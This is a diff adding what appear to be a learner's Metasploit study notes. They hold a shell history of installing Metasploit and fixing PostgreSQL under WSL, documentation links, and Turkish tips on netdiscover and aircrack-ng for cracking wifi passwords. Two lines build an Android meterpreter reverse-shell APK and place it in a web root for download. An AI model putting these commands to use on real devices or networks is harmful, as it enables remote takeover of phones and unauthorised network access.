@@ -1,0 +1,57 @@
+
+  165  curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall &&   chmod 755 msfinstall &&   ./msfinstall
+  166  /opt/metasploit-framework/bin/msfconsole
+  167  msfupdate
+  168  msfconsole
+  169  apt-get install -y metasploit
+  170  sudo apt-get install -y metasploit
+  171  msfvenom -p ndroid/meterpreter/reverse_tcp LHOST=192.168.1.29 LPORT=4444 R > /var/www/html/file.apk
+  172  updatedb
+  173  msfvenom -p ndroid/meterpreter/reverse_tcp LHOST=192.168.1.29 LPORT=4444 R > /var/www/html/file.apk
+  174  clear
+  175  /opt/metasploit-framework/bin/msfconsole
+  176  sudo systemctl restart
+  177  sudo systemctl restart metasploit
+  178  sudo systemctl enable --now postgresql
+  179  cd ..
+  180  sudo systemctl enable --now postgresql
+  181  cd /
+  182  cd root
+  183  sudo systemctl enable --now postgresql
+  184  apt install postgresql
+  185  sudo systemctl tatus postgresql
+  186  sudo systemctl status postgresql
+  187  sudo nano /etc/wsl.conf
+  188  sudo systemctl enable --now postgresql
+  189  wsl --shutdown
+  190  sudo systemctl list-units --type=service
+  191  hosts
+  192  msf
+  193  /opt/metasploit-framework/bin/msfconsole
+  194  msfconsole
+  195  history
+
+=============================================================================================
+
+https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
+
+https://docs.rapid7.com/metasploit/metasploitable-2/
+
+=============================================================================================
+
+
+1. sudo netdiscover
+
+	==> Bizimle aynı ağa bağlı cihazların IP adreslerini bulur.
+
+2. Cd root diyerek msfconsole çalıştırabilirsin.
+	=> /opt/metasploit-framework/bin/msfconsole
+
+
+3. apt install pciutils, sudo apt-get install aircrack-ng
+
+	=> wifi ağlarına saldırıp parolaları bulmamızı sağlar. 
+
+
+
+
